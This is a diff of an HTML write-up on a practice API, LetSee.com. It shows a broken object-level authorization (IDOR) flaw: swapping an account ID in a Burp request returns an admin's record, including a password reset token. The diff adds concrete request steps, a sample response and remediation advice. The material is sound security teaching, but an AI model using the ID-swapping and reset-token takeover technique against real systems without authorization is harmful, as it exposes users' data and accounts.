@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>LetSee.com: a BOLA in the account endpoint</title>
-  <meta name="description" content="A Broken Object Level Authorization (BOLA/IDOR) assessment: an API endpoint that trusts a client-supplied account number with no ownership check, exposing every user's account data to anyone with a valid session.">
+  <meta name="description" content="A Broken Object Level Authorization (BOLA/IDOR) finding from a formal security assessment: an authenticated account API endpoint trusts a client-supplied account number with no ownership check, exposing the admin account's PII and password reset token to any logged-in user.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -13,7 +13,7 @@
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; API Security</div>
   <h1>LetSee.com: a BOLA in the account endpoint</h1>
-  <p class="dek">A straightforward Broken Object Level Authorization finding: an authenticated account-lookup endpoint accepts any account number in the URL and never checks whether it belongs to the requesting user.</p>
+  <p class="dek">A straightforward Broken Object Level Authorization finding from a formal assessment: an authenticated account-lookup endpoint accepts any account number in the URL, never checks whether it belongs to the requesting user, and hands over the admin account's email, role, and a live password reset token to anyone who just edits a number.</p>
 
   <div class="meta-row">
     <span class="pill">Target: LetSee.com (practice API)</span>
@@ -22,7 +22,7 @@
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a practice web app with an authenticated API endpoint for viewing account details. The job: confirm whether authentication alone is standing in for authorization, or whether ownership is actually being checked.</p>
+    <p><strong>The setup:</strong> a practice web app with an authenticated API endpoint for viewing account details. The job: confirm whether authentication alone is standing in for authorization, or whether ownership is actually being checked. One finding was selected from the assessment to highlight here.</p>
   </div>
 
   <section>
@@ -32,13 +32,16 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the object reference in the request</div>
-          <p>Logging in normally and viewing an account page sends a request with the account number directly in the path:</p>
-          <pre><code>GET /api/accounts/&lt;account-number&gt;</code></pre>
-          <p>That number isn't a session token or an opaque identifier, it's a small, visibly sequential value.</p>
+          <div class="step-title">Create an account and capture the request that loads it</div>
+          <p>With Burp running as the proxy, signing up for a new account and logging in generates ordinary traffic. One request in the HTTP history stands out, a GET for the account page, with the account's own ID directly in the path:</p>
+          <pre><code>GET /api/accounts/17 HTTP/1.1
+Host: 54-153-37-124-letsee.vulnerablesites.net
+Cookie: _letsee_api_session=&lt;your own session cookie&gt;
+Uid: &lt;your own email&gt;</code></pre>
+          <p>That ID isn't a token or a UUID, it's a small, visibly sequential integer, exactly the kind of value worth testing.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Any identifier that appears directly in a URL or request body, especially a predictable one, is worth testing for authorization, not just authentication. The question isn't "can I reach this endpoint," it's "can I reach someone else's record through it."</p>
+            <p>Any identifier that appears directly in a URL, especially a predictable sequential one, is worth testing for authorization separately from authentication. The question isn't "can I reach this endpoint while logged in," it's "can I reach someone else's record through it while logged in as me."</p>
           </div>
         </div>
       </div>
@@ -46,11 +49,11 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Swap the account number while logged in as yourself</div>
-          <p>Capturing the request in Burp and changing the account number to a value that isn't the logged-in user's own:</p>
-          <pre><code>GET /api/accounts/&lt;someone-else's-account-number&gt;
-Cookie: session=&lt;your own valid session&gt;</code></pre>
-          <p>returns a full, valid response, another user's account data, served to a session that was never granted access to it.</p>
+          <div class="step-title">Send it to Repeater and swap the ID, still using your own session</div>
+          <p>Right-clicking the request and sending it to Repeater, then changing the path from <code>/api/accounts/17</code> to <code>/api/accounts/10</code>, with the exact same session cookie still attached, no new login, no new token, returns a full 200 response:</p>
+          <pre><code>GET /api/accounts/10 HTTP/1.1
+Host: 54-153-37-124-letsee.vulnerablesites.net
+Cookie: _letsee_api_session=&lt;your own session cookie, unchanged&gt;</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>This is the core of a BOLA/IDOR finding: the endpoint checks that <em>a</em> valid session exists, but never checks that the session belongs to the owner of the object being requested. Authentication and authorization are two different checks, and only the first one is happening here.</p>
@@ -61,11 +64,27 @@ Cookie: session=&lt;your own valid session&gt;</code></pre>
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Confirm the scope by iterating</div>
-          <p>Since the identifier is small and sequential, a quick sweep across a range of nearby account numbers, still using the same single valid session, confirms the issue isn't a one-off, it's every account on the platform, reachable by any authenticated user.</p>
+          <div class="step-title">The response is the administrator's own account</div>
+          <p>Account ID 10 turns out to belong to the platform's admin user, and the response hands over its full record, including a live password reset token:</p>
+          <pre><code>{
+  "result": {
+    "user": {
+      "id": 10,
+      "provider": "email",
+      "uid": "admin@cmdnctrl.net",
+      "name": "all powerful",
+      "nickname": "Administrator",
+      "email": "admin@cmdnctrl.net",
+      "admin": true,
+      "balance": "0.0",
+      "password_reset_token": "xxSecretTokenxx-admin@cmdnctrl.net-06082022-08",
+      "password_reset_sent_at": "2022-06-08T08:04:58.321Z"
+    }
+  }
+}</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Confirming scope matters for severity, not just existence. "One account leaked" and "every account is enumerable with one valid login" are very different findings to report, even though the underlying flaw is identical.</p>
+            <p>This is what turns "an authorization bug exists" into a concrete, high-severity finding: the leaked data isn't generic profile info, it's the admin flag confirming the account's privilege level and an active password reset token, which on most implementations is directly usable to take over the account outright.</p>
           </div>
         </div>
       </div>
@@ -74,19 +93,27 @@ Cookie: session=&lt;your own valid session&gt;</code></pre>
   </section>
 
   <section>
+    <h2 class="section-title">Remediation</h2>
+    <div class="brief">
+      <p><strong>Fixing unprotected routes:</strong></p>
+      <p>Do not rely on the client to enforce access control. Deny all access by default, and only allow an operation once the requesting user is confirmed to belong to the appropriate group or role, or to own the specific object being requested.</p>
+    </div>
+  </section>
+
+  <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
         <div class="skill-title">Authentication is not authorization</div>
-        <p>An endpoint can correctly reject unauthenticated requests and still fail completely at checking whether the authenticated user owns the resource they're asking for.</p>
+        <p>This endpoint correctly rejected requests with no session at all. It still failed completely at checking whether the authenticated session's owner matched the account being requested.</p>
       </div>
       <div class="skill">
         <div class="skill-title">Predictable object identifiers raise the stakes</div>
-        <p>A BOLA against a sequential integer ID is trivially scriptable into full enumeration. UUIDs don't fix the underlying authorization gap, but they do remove the easy sweep.</p>
+        <p>A BOLA against a small sequential integer ID is trivially scriptable into full account enumeration. The fix isn't switching to UUIDs, that just removes the easy sweep, it's an actual ownership check.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Always test with two accounts</div>
-        <p>A single test account can confirm an endpoint works. It takes a second account, and the deliberate attempt to cross the boundary between them, to confirm it's actually secure.</p>
+        <div class="skill-title">Severity depends on what's actually returned</div>
+        <p>A BOLA that leaks a display name is a different finding than one that leaks an active password reset token for an admin account. Always read the full response, not just confirm the status code.</p>
       </div>
     </div>
   </section>
